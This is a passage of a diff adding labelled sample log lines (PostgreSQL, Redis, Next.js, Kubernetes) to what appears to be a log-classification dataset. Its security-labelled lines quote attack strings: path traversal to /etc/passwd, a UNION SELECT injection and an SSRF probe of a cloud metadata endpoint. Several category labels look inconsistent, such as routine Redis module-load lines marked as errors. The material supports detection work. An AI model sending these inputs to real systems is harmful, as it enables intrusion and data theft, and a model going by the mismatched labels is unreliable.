+    "raw_log": "2026-09-15 07:32:25.440 UTC [277] LOG:  statement: TRUNCATE TABLE accounts CASCADE;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.476 UTC [277] LOG:  disconnection: session time: 0:00:00.039 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.700 UTC [284] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.702 UTC [284] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.704 UTC [284] LOG:  statement: VACUUM (VERBOSE) accounts;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.708 UTC [284] LOG:  disconnection: session time: 0:00:00.007 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.946 UTC [291] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.947 UTC [291] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.949 UTC [291] LOG:  statement: SET client_min_messages = WARNING;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.949 UTC [291] LOG:  disconnection: session time: 0:00:00.003 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.211 UTC [298] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.212 UTC [298] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.213 UTC [298] LOG:  statement: DISCARD ALL;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.214 UTC [298] LOG:  disconnection: session time: 0:00:00.003 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.451 UTC [306] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.452 UTC [306] LOG:  connection authorized: user=root database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.452 UTC [306] FATAL:  role \"root\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.734 UTC [313] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.735 UTC [313] LOG:  connection authorized: user=admin database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:26.735 UTC [313] FATAL:  role \"admin\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.013 UTC [320] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.015 UTC [320] LOG:  connection authorized: user=guest database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.015 UTC [320] FATAL:  role \"guest\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.271 UTC [327] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.272 UTC [327] LOG:  connection authorized: user=deploy_bot database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.272 UTC [327] FATAL:  role \"deploy_bot\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.571 UTC [334] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.572 UTC [334] LOG:  connection authorized: user=postgres_admin database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.572 UTC [334] FATAL:  role \"postgres_admin\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.824 UTC [341] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.825 UTC [341] LOG:  connection authorized: user=sql_user database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:27.825 UTC [341] FATAL:  role \"sql_user\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.044 UTC [349] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.045 UTC [349] LOG:  connection authorized: user=attacker_ip database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.045 UTC [349] FATAL:  role \"attacker_ip\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.266 UTC [356] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.267 UTC [356] LOG:  connection authorized: user=service_daemon database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.267 UTC [356] FATAL:  role \"service_daemon\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.512 UTC [363] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.512 UTC [363] LOG:  connection authorized: user=scanner_agent database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.512 UTC [363] FATAL:  role \"scanner_agent\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.767 UTC [370] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.768 UTC [370] LOG:  connection authorized: user=audit_test database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.768 UTC [370] FATAL:  role \"audit_test\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.991 UTC [377] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.992 UTC [377] LOG:  connection authorized: user=postgres database=restricted_confidential_db application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:28.992 UTC [377] FATAL:  database \"restricted_confidential_db\" does not exist",
+    "category": "security"
+  },
+  {
+    "system": "redis",
+    "raw_log": "Starting Redis Server",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:C 15 Sep 2026 07:32:31.412 * oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:C 15 Sep 2026 07:32:31.412 * Redis version=8.10.1, bits=64, commit=00000000, modified=1, pid=1, just started",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:C 15 Sep 2026 07:32:31.412 * Configuration loaded",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.412 * monotonic clock: POSIX clock_gettime",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.414 * Running mode=standalone, port=6379.",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> RedisBloom version 8.10.1 (Git=unknown)",
+    "category": "error"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> Registering configuration options: [",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> \t{ bf-error-rate       :      0.01 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> \t{ bf-initial-size     :       100 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> \t{ bf-expansion-factor :         2 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> \t{ cf-bucket-size      :         2 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> \t{ cf-initial-size     :      1024 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> \t{ cf-max-iterations   :        20 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> \t{ cf-expansion-factor :         1 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> \t{ cf-max-expansions   :        32 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.417 * <bf> ]",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.418 * Module 'bf' loaded from /usr/local/lib/redis/modules//redisbloom.so",
+    "category": "error"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.457 * <search> search-workers default: 12 (min of MAX_WORKER_THREADS=16 and CPU cores)",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.457 * <search> Redis version found by RedisSearch : 8.10.1 - oss",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.457 * <search> RediSearch version 8.10.0 (Git=)",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.457 * <search> gc: ON, prefix min length: 2, min word length to stem: 4, prefix max expansions: 200, query timeout (ms): 500, timeout policy: return, oom policy: return, cursor read size: 1000, cursor max idle (ms): 300000, max doctable size: 1000000, max number of search results:  1000000, default scorer: BM25STD,",
+    "category": "error"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.457 * <search> Initialized thread pools!",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.457 * <search> Enabled workers threadpool of size 12",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.458 * <search> Subscribe to config changes",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.458 * <search> Subscribe to cluster slot migration events",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.458 * <search> Subscribe to cluster topology change events",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.458 * <search> Enabled role change notification",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.458 * <search> Cluster configuration: AUTO partitions, type: 0, coordinator timeout: 0ms",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.459 * Module 'search' loaded from /usr/local/lib/redis/modules//redisearch.so",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> RedisTimeSeries version 81000, git_sha=",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> Redis version found by RedisTimeSeries : 8.10.1 - oss",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> Registering configuration options: [",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-compaction-policy   :              }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-num-threads         :            3 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-libmr-protocol      :     INTERNAL }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-retention-policy    :            0 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-duplicate-policy    :        block }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-chunk-size-bytes    :         4096 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-encoding            :   compressed }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-ignore-max-time-diff:            0 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-ignore-max-val-diff :     0.000000 }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> \t{ ts-topology-events     :         true }",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> ]",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.467 * <timeseries> Detected redis oss (cluster-enabled=no)",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.468 * <timeseries> Subscribe to ASM events",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.468 * <timeseries> Subscribe to topology changes events",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.468 * <timeseries> Enabled diskless replication",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.468 * Module 'timeseries' loaded from /usr/local/lib/redis/modules//redistimeseries.so",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.492 * <ReJSON> Created new data type 'ReJSON-RL'",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.492 * <ReJSON> version: 81000 git sha: unknown branch: unknown",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Exported RedisJSON_V1 API",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Exported RedisJSON_V2 API",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Exported RedisJSON_V3 API",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Exported RedisJSON_V4 API",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Exported RedisJSON_V5 API",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Exported RedisJSON_V6 API",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Exported RedisJSON_V7 API",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Exported RedisJSON_V8 API",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Enabled diskless replication",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <ReJSON> Initialized shared string cache, thread safe: true.",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * Module 'ReJSON' loaded from /usr/local/lib/redis/modules//rejson.so",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * <search> Acquired RedisJSON_V8 API",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.493 * Server initialized",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:31.494 * Ready to accept connections tcp",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:39.319 * Background saving started by pid 158",
+    "category": "warning"
+  },
+  {
+    "system": "redis",
+    "raw_log": "158:C 15 Sep 2026 07:32:39.321 * BGSAVE done, 0 keys saved, 0 keys skipped, 89 bytes written.",
+    "category": "warning"
+  },
+  {
+    "system": "redis",
+    "raw_log": "158:C 15 Sep 2026 07:32:39.333 * DB saved on disk",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "158:C 15 Sep 2026 07:32:39.334 * Fork CoW for RDB: current 0 MB, peak 0 MB, average 0 MB",
+    "category": "noise"
+  },
+  {
+    "system": "redis",
+    "raw_log": "1:M 15 Sep 2026 07:32:39.433 * Background saving terminated with success",
+    "category": "warning"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "GET /api/v1/health 200 OK 3.2ms",
+    "category": "noise"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "GET /static/chunks/main-app.js 200 OK 0.8ms",
+    "category": "noise"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "POST /api/v1/telemetry 204 No Content 5.4ms",
+    "category": "noise"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "GET /api/v1/user/profile 200 OK 18.2ms",
+    "category": "noise"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "GET /api/v1/dashboard/metrics 200 OK 24.1ms",
+    "category": "noise"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "Session refreshed for user deploy_agent from 10.0.1.25",
+    "category": "noise"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "Cache hit for key catalog:featured:items:v2",
+    "category": "noise"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "Worker thread pool initialized with 4 worker threads",
+    "category": "noise"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "Error: Failed to find Server Action \"a3f89b12c\". This request might be from an older or newer deployment.",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "Read more: https://nextjs.org/docs/messages/failed-to-find-server-action",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "at ignore-listed frames",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "at async resolveServerAction (node_modules/next/dist/server/app-render/action-handler.js:142:15)",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "Error: Failed to find Server Action \"d9e8712bc\". This request might be from an older or newer deployment.",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "Error: Failed to find Server Action \"f512c98a1\". This request might be from an older or newer deployment.",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "TypeError: Cannot read properties of undefined (reading 'getProfile')",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "at UserController.handle (src/controllers/user.ts:54:19)",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "at processTicksAndRejections (node:internal/process/task_queues:95:5)",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "TypeError: item.items.map is not a function",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "at renderCatalog (src/components/catalog.tsx:88:24)",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "SyntaxError: Unexpected token m in JSON at position 2",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "at JSON.parse (<anonymous>)",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "at parseRequestBody (src/middleware/parser.ts:22:12)",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "ReferenceError: activeTenantConfig is not defined",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "RangeError: Maximum call stack size exceeded",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "RangeError: Invalid array length",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "URIError: URI malformed at decodeURI (<anonymous>)",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "DatabaseError: Connection pool exhausted after 30000ms while acquiring client connection",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "DatabaseError: Connection lost - server closed the socket unexpectedly",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "FetchError: request to https://payment.internal/v1/charge failed, reason: connect ECONNREFUSED 10.0.4.12:443",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "FetchError: request to https://api.partner.com/v2/webhooks failed, reason: socket hang up",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "FetchError: request to https://storage.s3.internal/uploads failed, reason: ETIMEDOUT",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "Error: getaddrinfo ENOTFOUND internal-service.mesh",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "Error: listen EADDRINUSE: address already in use 0.0.0.0:3000",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "InvariantViolation: Expected active session but received null",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "ValidationError: User email \"invalid-email\" violates RFC 5322 regex",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] JWT signature validation failed for issuer https://auth.prod.internal: token expired at 1726308000",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] JsonWebTokenError: invalid signature on bearer token",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] CORS policy violation: Origin https://evil-site.com not allowed by Access-Control-Allow-Origin",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] CSRF token mismatch: Expected 9b2d... but received invalid_token_xyz",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] Rate limit threshold reached for client IP 192.168.1.105 (429 Too Many Requests)",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] Malicious path traversal attempted in static file handler: /../../etc/passwd",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] CSP violation blocked inline script execution with sha256-hash abc123",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] SSRF protection blocked outgoing HTTP request to AWS metadata endpoint 169.254.169.254",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] Detected SQL injection pattern in query param order_by: UNION SELECT * FROM secrets",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[SECURITY] Brute force login threshold exceeded: 10 failed attempts for account admin@company.com",
+    "category": "security"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "(node:1234) [DEP0040] DeprecationWarning: The punycode module is deprecated. Please use a userland alternative instead.",
+    "category": "warning"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "(node:1234) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 error listeners added to [EventEmitter]. Use emitter.setMaxListeners() to increase limit",
+    "category": "warning"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "(node:1234) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[WARN] Node.js heap memory usage at 88.4% (1768MB / 2000MB limit)",
+    "category": "error"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[WARN] Slow query detected on table \"audit_logs\" taking 3450ms (threshold: 1000ms)",
+    "category": "warning"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[WARN] Client 10.0.2.14 consumed 92% of allotted request quota (920/1000 requests in 60s window)",
+    "category": "warning"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[WARN] LRU cache capacity reached 98% (49000/50000 entries), accelerating TTL eviction",
+    "category": "warning"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[WARN] Gateway response from service-auth took 2890ms, exceeding P99 threshold of 1500ms",
+    "category": "warning"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[WARN] Outgoing webhook delivery retry #3 for event order.created to https://client.api/hook",
+    "category": "warning"
+  },
+  {
+    "system": "nextjs_node",
+    "raw_log": "[WARN] DNS lookup took 1240ms for host external.service.com, potential latency degradation",
+    "category": "warning"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=SandboxChanged component=kubelet msg=\"Pod sandbox changed, it will be killed and re-created.\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"sentria:latest\" already present on machine and can be accessed by the pod\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Created component=kubelet msg=\"Container created\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Started component=kubelet msg=\"Container started\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Starting component=kubelet msg=\"Starting kubelet.\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=NodeHasSufficientMemory component=kubelet msg=\"Node sentria-cluster-control-plane status is now: NodeHasSufficientMemory\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=NodeHasNoDiskPressure component=kubelet msg=\"Node sentria-cluster-control-plane status is now: NodeHasNoDiskPressure\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=NodeHasSufficientPID component=kubelet msg=\"Node sentria-cluster-control-plane status is now: NodeHasSufficientPID\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=NodeAllocatableEnforced component=kubelet msg=\"Updated Node Allocatable limit across pods\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Warning] reason=Rebooted component=kubelet msg=\"Node sentria-cluster-control-plane has been rebooted, boot id: 83c626ff-44d7-4cd0-ad1e-bbc426902390\"",
+    "category": "warning"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Starting component=kubelet msg=\"\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=RegisteredNode component=node-controller msg=\"Node sentria-cluster-control-plane event: Registered Node sentria-cluster-control-plane in Controller\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
